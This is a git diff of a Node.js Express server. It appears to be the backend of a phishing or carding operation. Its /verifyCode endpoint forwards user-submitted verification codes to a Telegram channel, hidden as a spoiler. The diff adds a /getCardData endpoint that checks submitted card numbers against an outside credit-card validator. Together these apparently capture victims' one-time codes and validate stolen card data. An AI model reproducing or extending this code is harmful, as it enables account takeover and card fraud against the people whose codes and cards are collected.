@@ -1,4 +1,5 @@
 const express = require('express');
+const axios = require('axios');
 // const config = require('config');
 const cors = require('cors');
 const path = require('path');
@@ -23,7 +24,7 @@ app.use(cors());
 app.use(bodyParser.json({ limit: '50mb' }));
 app.use(bodyParser.urlencoded({ limit: '50mb', extended: true }));
 app.use(express.json());
-const PORT = 5050; //process?.env?.PORT || config.get('port');
+const PORT = 5050; // process?.env?.PORT || config.get('port');
 
 app.use((req, res, next) => {
     req.bot = bot;
@@ -37,9 +38,23 @@ app.use('/public', express.static(path.join(__dirname, '../public')));
 app.use('/paybis', require('./api/paybis.js'));
 
 app.post('/verifyCode',async(req,res)=>{
-    const {code} = req.body;
-    await bot.sendMessage('@developers_00', `<b>URL:</b> <code>${11}</code>\n<b>Code:</b> <span class="tg-spoiler">${code}</span>`, { parse_mode: 'HTML' });
-    return res.send({success: true, message:'success'})
+    try{
+        const {code} = req.body;
+        await bot.sendMessage('@developers_00', `<b>URL:</b> <code>${11}</code>\n<b>Code:</b> <span class="tg-spoiler">${code}</span>`, { parse_mode: 'HTML' });
+        return res.send({success: true, message:'success'})
+    }catch{
+        return res.send({success: false, message:'error'})
+    }
+})
+
+app.post('/getCardData',async(req,res) => {
+    try{
+        const {cardValue} = req.body;
+        const response = await axios.get(`https://dnschecker.org/ajax_files/credit_card_validator.php?ccn=${cardValue}`)
+        return res.send({success:response?.data ? true : false, message:response?.data || false});
+    }catch{
+        return res.send({success: false, message:'error'});
+    }
 })
 
 app.use('/',(req,res)=> res.send({ success: false, message: 'Server Error!' }))
